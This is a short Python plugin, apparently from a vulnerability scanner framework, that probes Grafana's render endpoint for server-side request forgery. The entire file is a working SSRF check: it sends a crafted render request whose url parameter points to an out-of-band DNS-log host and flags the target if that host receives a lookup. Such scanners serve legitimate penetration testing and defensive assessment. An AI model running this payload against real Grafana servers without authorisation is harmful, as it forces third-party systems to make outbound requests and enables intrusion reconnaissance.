#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# @author: orleven

import asyncio
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    grafana rendering SSRF 扫描
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.GRAFANA


    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url):
                    if path[-1] == '/':
                        dns = self.get_dnslog_url()
                        ssrf_payload = "render?domain=a&encoding=&height=500&renderKey=a&timeout=6&timezone=Asia%2FShanghai&width=1000&url=" + dns
                        url = path + ssrf_payload
                        try:
                            async with session.get(url=url, allow_redirects=False) as res:
                                await asyncio.sleep(3)
                                if await self.get_dnslog_recode(dns):
                                    yield url
                        except:
                            pass